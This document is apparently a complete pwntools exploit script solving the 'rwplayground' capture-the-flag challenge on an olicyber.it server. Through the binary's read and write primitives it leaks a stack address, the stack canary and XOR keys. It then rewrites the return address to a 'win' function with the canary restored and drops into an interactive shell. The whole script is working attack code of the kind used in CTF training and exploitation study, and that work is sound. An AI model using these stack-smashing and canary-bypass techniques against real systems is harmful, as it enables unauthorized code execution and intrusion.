#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

exe = context.binary = ELF(args.EXE or 'rwplayground')

host = args.HOST or 'rwplayground.challs.olicyber.it'
port = int(args.PORT or 38051)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)
    
    
def write_qword(conn: remote | process, addr: bytes, data: bytes) -> None:
    assert len(addr) <= 16, "Invalid addr length"
    assert len(data) <= 16, "Invalid data length"
    
    conn.sendlineafter(b'> ', b'2')
    conn.recvline()
    conn.sendline(addr.hex().encode())
    conn.recvline()
    conn.sendline(data.hex().encode())
    
    
def read_qword(conn: remote | process, addr: bytes) -> bytes:
    assert len(addr) <= 16, "Invalid addr length"
        
    conn.sendlineafter(b'> ', b'1')
    conn.recvline()
    conn.sendline(addr.hex().encode())
    data = conn.recvline()

    return bytes.fromhex(data.split(b': 0x')[-1].decode().strip().ljust(16, '0'))


def sub_addr(addr: bytes, size: int) -> bytes:
    return long_to_bytes(bytes_to_long(addr) - size)


def add_addr(addr: bytes, size: int) -> bytes:
    return long_to_bytes(bytes_to_long(addr) + size)


gdbscript = '''
tbreak main
continue
b *main+39
b *main+213
b *main+218
'''.format(**locals())

# -- MACROS --

win = exe.sym['win'] + 5

# -- Exploit goes here --

io = start()

log.info(f'Win function addr: {hex(win)}')

# -- Leak memory address

leak = io.recvlines(2)[-1].decode().strip().split("... ")[-1][2:]
leak = bytes.fromhex(leak)
rbp = add_addr(leak, 0x0C)

log.info(f'Leak address: {leak.hex()}')
log.info(f'RBP: {rbp.hex()}')

# -- Leak canary

canary = read_qword(io, sub_addr(rbp, 0x08))
log.info(f'XORED Canary: {canary.hex()}')

# -- Leak write key XOR read key

write_qword(io, leak, b'\x00' * 8)
wk_rk = read_qword(io, leak)
log.info(f'write_key ^ read_key: {wk_rk.hex()}')

# -- Leak read key

write_qword(io, leak, wk_rk)
rk = read_qword(io, sub_addr(leak, 4))
log.success(f'Read key: {rk.hex()}')

# -- Leak write key

tmp_leak = add_addr(leak, 4)

write_qword(io, tmp_leak, rk)
wk = read_qword(io, tmp_leak)

log.success(f'Write key: {wk.hex()}')

# -- EXPLOIT

canary = xor(canary, rk)

log.info(f'Canary: {canary.hex()}')
log.info('Sending exploit...')
tmp_wk = wk[:3] + bytearray([wk[3] ^ 1]) + wk[4:]

write_qword(io, add_addr(rbp, 0x08), xor(p64(win, endianness='big'), tmp_wk))
write_qword(io, sub_addr(rbp, 0x08), xor(canary, wk))
io.sendlineafter(b'> ', b'4')
io.recvline()

log.success('Exploit sent!')
context.log_level = 'WARNING'

print('\n' + '-' * 30 + "SHELL" + '-' * 30 + '\n')

io.interactive()
io.close()